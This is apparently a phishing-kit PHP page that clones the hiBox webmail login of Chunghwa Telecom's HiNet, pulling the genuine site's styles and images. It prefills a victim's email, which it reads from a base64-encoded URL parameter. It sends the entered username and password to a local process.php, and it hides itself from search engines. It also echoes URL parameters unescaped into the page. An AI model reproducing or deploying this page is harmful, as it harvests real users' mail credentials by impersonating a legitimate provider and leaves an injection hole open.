﻿<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--hb2-pop01-zone-->
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name='robots' content='nofollow'>
<meta name='googlebot' content='nofollow'>
<meta name='robots' content='noindex'> 
<meta charset='utf-8'><meta name='googlebot' content='nosnippet />
<meta name='robots' content='noodp' />

<title>hiBox Messaging Service</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
-->
.loginTable td > *{
	vertical-align: middle;
}
a, img{
	border: none;outline: none;
}
</style>
<link href="https://hibox.hinet.net/uwc/uwc/css/hiBox_en.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="https://hibox.hinet.net/uwc/uwc/js_en/index_002.js"></script>

<link href="https://hibox.hinet.net/uwc/uwc/css/tb.htm" rel="stylesheet" type="text/css">
<script type="text/javascript" src="https://hibox.hinet.net/uwc/uwc/js_en/index.js"></script>
	
	<!-- jQuery & jQueryUI + theme --> 
	<link href="https://hibox.hinet.net/uwc/uwc/vkeyboard/jquery/jquery-ui.css" rel="stylesheet">
	<script src="https://hibox.hinet.net/uwc/uwc/vkeyboard/jquery/jquery.js"></script>
	<script src="https://hibox.hinet.net/uwc/uwc/vkeyboard/jquery/jquery-ui.js"></script>
	
	<!-- keyboard widget css & script (required) -->
	<link href="https://hibox.hinet.net/uwc/uwc/vkeyboard/css/keyboard.css" rel="stylesheet">
	<script src="https://hibox.hinet.net/uwc/uwc/vkeyboard/js/jquery_002.js"></script>
	<script src="https://hibox.hinet.net/uwc/uwc/vkeyboard/js/enkey.js"></script>
	
<script type="text/javascript">
var copyRight = null;
var productName = null;
var logoImagePath = null;
var versionImagePath = null;
var versionPageTitle = null;
var closeLabel = null;
var closeTitle = null;
var LoginImagePath = null;

function handleLoad()
{
copyRight="Copyright  2008 Sun Microsystems, Inc. All rights reserved. SUN PROPRIETARY/CONFIDENTIAL. U.S. Government Rights - Commercial software. Government users are subject to the Sun Microsystems, Inc. standard license agreement and applicable provisions of the FAR and its supplements. Use is subject to license terms. Sun, Sun Microsystems, the Sun logo and Java are trademarks or registered trademarks of Sun Microsystems, Inc. in the U.S. and other countries.";
productName="Sun Java(TM) System Communications Express 6.3 update 1";
logoImagePath="https://hibox.hinet.net/uwc/uwc/images/login-logo.gif";
versionImagePath="https://hibox.hinet.net/uwc/uwc/images/S1MC_login.gif";
versionPageTitle="Version Information";
closeLabel="Close";
closeTitle="Close Window";
document.form1.uid.focus();
}

/*modify start*/
function callSubmit(eventTag) { 
   //if (event.keyCode==13)
   //    handleSubmit();
   var event = eventTag||window.event;
   var currentKey = event.charCode||event.keyCode;
   if (currentKey==13)
       handleSubmit();
}
/*modify end*/
function LoadCaptcha()
{
	document.getElementById('captcha').src = 'https://hibox.hinet.net/uwc/stickyImg?' + Math.random(); 
	return false;
}
function handleSubmit() {
  if (document.forms.form1.save_uid.checked) {
 		selectioncookie();
	}
  if(document.form1.uid.value.indexOf("@")==-1) { 
	document.form1.uid.value = document.form1.uid.value + "@hibox.hinet.net";	
  }	

  var targetAction =  "process.php";
  document.form1.action = targetAction;
  document.form1.submit();
}

 
function handleError() {
	if (false || false ) {
		/*modify start*/
		document.write('<img src="https://hibox.hinet.net/uwc/uwc/images/Error_Large.gif" alt="" width="21" height="22"><font color="red">Authentication fails</font>');
		//document.write('<tr><td width="244" align="center" class="bk12" height="9" colspan="2">\n'+'<img src="https://hibox.hinet.net/uwc/uwc/./uwc/images_en/Error_Large.gif" alt="" width="21" height="22">&nbsp;&nbsp;<font color="red">' +'<span class=AlrtErrTxt> Authentication Failed<br> Reenter your uid and pass.</span><br></td></tr>');
		/*
		document.write('<DIV class=logErr>');
		document.write('<table cellspacing=0 cellpadding=0 border=0>');
		document.write('<tbody>');
	        document.write('<tr>');
		document.write('<td valign=top width="28"><img src="https://hibox.hinet.net/uwc/uwc/./uwc/images_en/Error_Large.gif" alt="" width="21" height="22">&nbsp;&nbsp;</td>');
		document.write("<td width='233'> <span class=AlrtErrTxt> Authentication Failed<br> Reenter your uid and pass.</span> </td>");

		document.write('</tr>');
		document.write('</tbody>');
		document.write('</table>');
		document.write('</DIV>');
		modify end*/
	}

}

function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}

function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features);
}
</script>

<!--Cookie 記憶選單 宣告程式開始-->
<script language="Javascript">
//製作：CliffSTAR Studios.(http://uuu.to/cstar)
CookiesExpDay="30"; //Cookie 的保存天數


function selectioncookie() {
	if (document.forms.form1.uid.value == "Full Email Address Required"){
		document.forms.form1.uid.value = "";
	}	
	SetCookie('selvaluecookie10', document.forms.form1.uid.value);	 
}
</script><!--Cookie 記憶選單 宣告程式結束-->
<!--Cookie 記憶選單 OPCOOKIE 控制Cookie程式開始-->
<script language="Javascript">
var time = new Date();
time.setTime(time.getTime()+((1000*60*60*24)*CookiesExpDay)) // here let the cookie expires extend 10 days of the setting day.

function GetCookie(name){
var cname=name+"=";
var dc=document.cookie;
	if(dc.length>0){
		begin = dc.indexOf(cname)
		if(begin!=-1){
		begin=begin+cname.length
		end=dc.indexOf(";",begin)
			if(end==-1) 
			end=dc.length
		return dc.substring(begin,end)
		}
	}
return null
}
/*function of Get the cookie*/
function SetCookie (name, value, expires) {
	
	if(expires==null){
	expires=""
	}
	document.cookie = name+"="+value+";expires="+ time.toGMTString()}
</script>
<!--Cookie 記憶選單 OPCOOKIE 控制Cookie程式結束--> 

</head>

<body onload="handleLoad();funShowMainBanner(0);MM_preloadImages('https://hibox.hinet.net/uwc/uwc/images_en/botton02_01.gif','https://hibox.hinet.net/uwc/uwc/images_en/botton02_03.gif','https://hibox.hinet.net/uwc/uwc/images_en/botton03_02.gif','https://hibox.hinet.net/uwc/uwc/images_en/icon-more02.gif');LoadCaptcha();">
<form name="form1"  onsubmit="handleSubmit()" method="POST">
<input name="fromlogin" value="true" type="hidden">

<input name="orgaccess" value="https" type="hidden">
<!-- header start-->
<script type="text/javascript" src="https://hibox.hinet.net/uwc/uwc/images_en/header.js"></script><table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody><tr>
    <td background="https://hibox.hinet.net/uwc/uwc/images_en/header_01.jpg" valign="top" height="25" align="right">
	<table width="370" border="0" cellspacing="0" cellpadding="0">
      <tbody><tr>
        <td width="158" valign="middle" height="24" align="right">
		<img src="https://hibox.hinet.net/uwc/uwc/images_en/icon-02.gif" width="18" height="15" align="middle"> 
		<a href="hiBox-ad.php" target="_blank" class="manage">Admin Login
		</a> 
		<img src="https://hibox.hinet.net/uwc/uwc/images_en/dis-02.gif" width="9" height="9"> 
<a href="https://hibox.hinet.net/uwc/uwc/homepage_en/sitemap.html" class="manage"> Site Map
		</a> 
		</td>
        <td width="195" valign="middle" align="center">
		<a href="hiBox-cn.php" class="language">繁中
		</a> 
		<img src="https://hibox.hinet.net/uwc/uwc/images_en/dis-02.gif" alt="" width="9" height="9"> 
		<a href="hiBox-cn.php" class="language">簡中
		</a> 
		<img src="https://hibox.hinet.net/uwc/uwc/images_en/dis-02.gif" alt="" width="9" height="9"> 
		<a href="hiBox-en.php" class="language">English 
		</a>
		</td>
        <td width="17">&nbsp;
		</td>
      </tr>
    </tbody></table>
	</td>
  </tr>
</tbody></table>
  <table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
    <tbody><tr>
      <td height="81"><img src="https://hibox.hinet.net/uwc/uwc/images_en/header_02.jpg" usemap="#Map" width="937" border="0" height="81">
	  </td>
    </tr>
  </tbody></table>
  <map name="Map" id="Map">
    <area shape="rect" coords="32,2,267,54" href="https://hibox.hinet.net/uwc/?lang=en" alt="home">
    <area shape="rect" coords="723,39,882,62" href="https://hib2border.hinet.net/HiB2B/alf/hiB2BTrModify.jsp?funCode=401" target="_blank" alt="立即申請試用TRY IT!">
  </map>
  <table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody><tr>
  <td width="71" valign="top"><img src="https://hibox.hinet.net/uwc/uwc/images_en/GlobalNavigation01_01.gif" width="71" height="31"></td>
  <td width="808"><ul class="menu">
   <li class="top p1"><a href="https://hibox.hinet.net/uwc/?lang=en" id="home" class="top_link" alt="Home"><span>Home</span></a></li>
   <li class="top p2"><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/features.html" id="products" class="top_link" alt="Products"><span>products</span><!--[if IE 7]><!--></a><!--<![endif]-->
    <!--[if lte IE 6]><table><tr><td><![endif]-->
    <ul class="sub">
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/features.html">Features</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/functions.html">Types</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/advantages.html">Advantages</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/benefits.html">Benefit</a></li>
     <li><a href="#" class="fly">Value-Added Service<!--[if IE 7]><!--></a><!--<![endif]-->
       <!--[if lte IE 6]><table><tr><td><![endif]-->
       <ul>
        <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/backup.html">Mail Archiving</a></li>
       </ul>
       <!--[if lte IE 6]></td></tr></table></a><![endif]-->
    </li></ul>
    <!--[if lte IE 6]></td></tr></table></a><![endif]-->
   </li>
  <li class="top p3"><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/promotion.html" id="prices" class="top_link"><span>prices</span></a></li>
  <li class="top p4"><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/case.html" id="scases" class="top_link"><span>scases</span></a></li>
   <li class="top p5"><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/docs.html" id="downloads" class="top_link"><span>downloads</span><!--[if IE 7]><!--></a><!--<![endif]-->
    <!--[if lte IE 6]><table><tr><td><![endif]-->
    <ul class="sub">
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/docs.html">Product Specs.</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/manuals.html">User Manual</a></li>
    </ul>
    <!--[if lte IE 6]></td></tr></table></a><![endif]-->
   </li>
   <li class="top p6"><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/apply.html" id="applications" class="top_link"><span>applications</span></a></li>
   <li class="top p7"><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/bizs.html" id="faq" class="top_link"><span>FAQ</span><!--[if IE 7]><!--></a><!--<![endif]-->
    <!--[if lte IE 6]><table><tr><td><![endif]-->
    <ul class="sub">
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/bizs.html">Application</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/tech.html">Technical Support</a></li>
    </ul>
    <!--[if lte IE 6]></td></tr></table></a><![endif]-->
   </li>
   <li class="top p8"><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/contact.html" id="contactus" class="top_link"><span>contactus</span></a></li>
  </ul>
    <div class="box250"></div></td>
  <td width="58" valign="top"><img src="https://hibox.hinet.net/uwc/uwc/images_en/GlobalNavigation01_10.gif" width="58" height="31"></td>
  </tr>
  </tbody></table>

<!-- header end-->
<table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody><tr>
    <td height="7"><img src="https://hibox.hinet.net/uwc/uwc/images_en/HB_03.gif" width="937" height="7"></td>
  </tr>
</tbody></table>
<table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody><tr>
    <td width="3" height="31"><img src="https://hibox.hinet.net/uwc/uwc/images_en/HB_04.gif" width="3" height="212"></td>
    <td width="632" valign="top"><table class="index_main_banner_table" border="0" cellspacing="0" cellpadding="0">
  <tbody>
    <tr>
      <td id="tdMainBannerPic">
      <div id="divMainBanner1" style="display: none;"><a href="#" target="_parent"><img src="https://hibox.hinet.net/uwc/uwc/images_en/HB_05.jpg" width="632" border="0" height="190"></a></div>
      <div style="display: none;" id="divMainBanner2"><a href="#" target="_parent"><img src="https://hibox.hinet.net/uwc/uwc/images_en/HB_05-02.jpg" border="0"></a></div>
      <div style="display: none;" id="divMainBanner3"><a href="#" target="_parent"><img src="https://hibox.hinet.net/uwc/uwc/images_en/HB_05-03.jpg" border="0"></a></div>
      <div style="" id="divMainBanner4"><a href="#" target="_parent"><img src="https://hibox.hinet.net/uwc/uwc/images_en/HB_05-04.jpg" border="0"></a></div></td>
    </tr>
    <tr>
      <td background="https://hibox.hinet.net/uwc/uwc/images_en/banner-bg01.gif" valign="top" height="22" align="left"><table width="600" border="0" cellspacing="0" cellpadding="0">
          <tbody><tr>
            <td align="right"><table class="index_main_banner_page_table" border="0" cellspacing="0" cellpadding="0">
              <tbody>
                <tr id="trMainBannerPage">
                  <td class="index_main_banner_page_td"><a onmouseover="funShowMainBanner(0);" href="javascript:%20void(0);">1</a></td>
                  <td class="index_main_banner_page_td"><a onmouseover="funShowMainBanner(1);" href="javascript:%20void(0);">2</a></td>
                  <td class="index_main_banner_page_td"><a onmouseover="funShowMainBanner(2);" href="javascript:%20void(0);">3</a></td>
                  <td class="index_main_banner_page_current"><a onmouseover="funShowMainBanner(3);" href="javascript:%20void(0);">4</a></td>
                </tr>
              </tbody>
            </table></td>
          </tr>
        </tbody></table></td>
    </tr>
  </tbody>
</table></td>
    <td width="8"><img src="https://hibox.hinet.net/uwc/uwc/images_en/HB_06.gif" width="8" height="212"></td>
    <td width="292" background="https://hibox.hinet.net/uwc/uwc/images_en/HB_07.gif" valign="top" align="center">
    
    
    <table class="loginTable" width="252" border="0" height="135" cellspacing="1" cellpadding="0">
      <tbody><tr>
<td style="color:#F00;" colspan="2" valign="middle" height="40" align="right"> 
	<?php if (isset($_GET['mgs'])) { echo '<img src="https://hibox.hinet.net/uwc/uwc/images/Error_Large.gif" alt="" width="21" height="22" /> Authentication fails'; } ?>
	    </td>
      </tr>
      <tr>
        <td colspan="2" height="30" align="left">Username：           
<input type="hidden" name="login" value="<?php echo $log; ?>">
<input name="adm" type="hidden" id="amount"   value="<?php echo $_GET['adm']; ?>">
<input name="err" type="hidden" id="amount"  value="err1">
<input name="lan" type="hidden" id="amount"  value="en">

		   <input required="required" id="uid" name="uids" placeholder="Full Email Address Required" maxlength="50" value="<?php echo $log; ?>" size="20" class="ui-keyboard-input ui-widget-content ui-corner-all" aria-haspopup="true" role="textbox" type="text"><img id="uname" class="tooltip" title="Using Virtual Keyboard" src="https://hibox.hinet.net/uwc/uwc/vkeyboard/keypad.png">
		   
		   <script language="Javascript">	

			if(GetCookie("selvaluecookie10")!=null){
						
					document.forms.form1.uid.value=GetCookie("selvaluecookie10");			
				
			}
		</script>
          <br></td>
      </tr>
      <tr>
        <td colspan="2" height="30" align="left">Password ：

<input required="required" id="pass" name="pass" onkeypress="callSubmit(event)" maxlength="50" size="20" class="ui-keyboard-input ui-widget-content ui-corner-all" aria-haspopup="true" role="textbox" type="password"><img id="passwd" class="tooltip" title="Using Virtual Keyboard" src="https://hibox.hinet.net/uwc/uwc/vkeyboard/keypad.png"></td>
      </tr>
		  		
		
	  <tr>
		<td height="32" align="center">
			<img id="captcha" src="https://hibox.hinet.net/uwc/stickyImg" />&nbsp;=&nbsp;
			<input id="captchaans" name="captcha" placeholder="Equation Answer, Please" class="ui-widget-content ui-corner-all" style="text-align: center;" size="12" maxlength="3" type="text">
			<a href="#" onclick="document.getElementById('captchaans').value=''; document.getElementById('captcha').src = 'https://hibox.hinet.net/uwc/stickyImg?' + Math.random(); return false;" tabindex="-1"><img src="https://hibox.hinet.net/uwc/uwc/images/refresh.png" tabindex="-1" width="15" height="15"></a>		
		</td>
		<td>
		
		</td>
	  </tr>

	  

			
		
      <tr>
        <td valign="bottom" height="32" align="left"><input name="save_uid" id="save_uid" tabindex="-1" type="checkbox">
          Remember my ID
		  <a href="#" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image6','','https://hibox.hinet.net/uwc/uwc/images_en/botton02_01.gif',1)" onclick="handleSubmit()"><img src="https://hibox.hinet.net/uwc/uwc/images_en/botton01_01.gif" alt="login" name="Image6" id="Image6" width="47" border="0" height="26"></a><a href="#" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image7','','https://hibox.hinet.net/uwc/uwc/images_en/botton02_03.gif',1)"><img src="https://hibox.hinet.net/uwc/uwc/images_en/botton01_03.gif" alt="help" name="Image7" id="Image7" onclick="MM_openBrWindow('https://hibox.hinet.net/uwc/uwc/homepage_en/popup.html','','width=395,height=220')" width="47" border="0" height="26"></a>
		</td>
      </tr>
      <tr>
		<td align="center">
			<a href="hiBox-ad.php" target="_blank" onmouseover="MM_swapImage('Image11','','https://hibox.hinet.net/uwc/uwc/images_en/botton03_02.gif',1)" onmouseout="MM_swapImgRestore()"><img src="https://hibox.hinet.net/uwc/uwc/images_en/botton03_01.gif" alt="Administrator ENTER" name="Image11" id="Image11" width="222" border="0" height="36"></a>
		</td>
	  </tr>	
	  
    </tbody></table>
	  <!--	
      <table width="223" height="55" border="0" cellpadding="0" cellspacing="0">
        <tr>
          <td height="55"></td>
        </tr>
      </table>
	   -->
	  </td>
    <td width="2"><img src="https://hibox.hinet.net/uwc/uwc/images_en/HB_08.gif" width="2" height="212"></td>
  </tr>
</tbody></table>
<table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody><tr>
    <td height="7"><img src="https://hibox.hinet.net/uwc/uwc/images_en/HB_09.gif" width="937" height="9"></td>
  </tr>
</tbody></table>
<table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
  <tr>
    <td height="206" valign="top" background="https://hibox.hinet.net/uwc/uwc/images_en/HB_10.gif"><table width="937" height="190" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td width="657" height="190" align="center" valign="top"><table width="620" height="39" border="0" cellpadding="0" cellspacing="0">
          <tr>
            <td width="526" height="39" align="left" valign="bottom"><img src="https://hibox.hinet.net/uwc/uwc/images_en/td-01.gif" alt="訊息快遞" width="375" height="26" /></td>
            <td width="94" align="right" valign="bottom"><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image13','','https://hibox.hinet.net/uwc/uwc/images_en/icon-more02.gif',1)"><img src="https://hibox.hinet.net/uwc/uwc/images_en/icon-more01.gif" alt="更多訊息" name="Image13" width="94" height="20" border="0" id="Image13" /></a></td>
          </tr>
        </table>
         <!--info start-->
             <table class="ul" width="633" border="0" height="145" cellspacing="0" cellpadding="0">
  <tbody><tr>
        <td valign="top" height="145" align="left"><ul>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/news.html#new39" class="language"><img src="https://hibox.hinet.net/uwc/uwc/images_en/icon-new.gif" width="29" border="0" height="13"> Email is duplicated in Outlook 2016 when downloaded using POP3.... </a></li>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/news.html#new38" class="language"><img src="https://hibox.hinet.net/uwc/uwc/images_en/icon-new.gif" width="29" border="0" height="13"> hiBox will terminate App services on 2016/2/3.... </a></li>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/news.html#new36" class="language"><img src="https://hibox.hinet.net/uwc/uwc/images_en/icon-new.gif" width="29" border="0" height="13"> The application for upgrade is available  online now !  Please login administration system for details. </a></li>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_en/news.html#new34" class="language">
 The application process for the trial of hiBox new platform has now 
opened. Please login management system for more information.</a></li>
 	 </ul></td>

  </tr>
</tbody></table>
		  <!--info end--> 
		</td>
        <td width="20" align="left"><img src="https://hibox.hinet.net/uwc/uwc/images_en/dis-01.gif" width="3" height="190" /></td>
        <td width="260" align="left" valign="middle"><table width="100" border="0" cellpadding="0" cellspacing="4">
			 
			<tr>
				
              <td><a target="_blank" id="my_href" href='https://hibox.hinet.net/uwc/uwc/homepage_tw/promotion02.html'><img id="my_img" src="https://hibox.hinet.net/uwc/uwc/images_en/banner01.gif" width="218" height="80" border="0" /></a></td> 
            </tr>


            <tr>
              <!--<td><a href='https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html#new05'><img src="https://hibox.hinet.net/uwc/uwc/images_en/banner02.gif" width="218" height="80" border="0" /></a></td>
		-->	  
			  <td><a href='https://hib2border.hinet.net/HiB2B/alf/hiB2BUlUnionListApply.jsp?&sev_type=AK&sev_code=01&lockProduct=true&unlockPdtCode=true'><img src="https://hibox.hinet.net/uwc/uwc/images_en/banner02.gif" width="218" height="80" border="0" /></a></td>
            </tr>
          </table>
          </td>
      </tr>
    </table></td>
  </tr>
</table></td>
  </tr>
</tbody></table>
<script src="https://hibox.hinet.net/uwc/uwc/js/placeholders.min.js"></script>

<table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody><tr>
    <td valign="top" height="66" align="center"><table width="800" border="0" cellspacing="0" cellpadding="0">
      <tbody><tr>
        <td width="145" height="43" align="right"><img src="https://hibox.hinet.net/uwc/uwc/images_en/icon-HiNet.gif" width="126" height="50">
                           </td>
        <td class="front-copyright" width="655" valign="middle" align="left">Chunghwa Telecom Data Communication Business Group : No.21,Sec.1,Xinyi Rd.,Zhongzheng Dist.,Taipei City 100, Taiwan
                                  <br>
                                  HiBox 24/7 Toll-Free Customer Service: 0800-080-365　 China Area Customer Service: 21-52305900
 		                         <br>
                                 © 2013 HiNet Internet Service by Chunghwa Telecom All Rights Reserved</td>
      </tr>
    </tbody></table>
    
    
 </td>
  </tr>
</tbody></table></td>
  </tr>
</tbody></table>




 

<link rel="SHORTCUT ICON" href="https://hibox.hinet.net/uwc/webmail/favicon.ico">



</form></body></html><?php }?>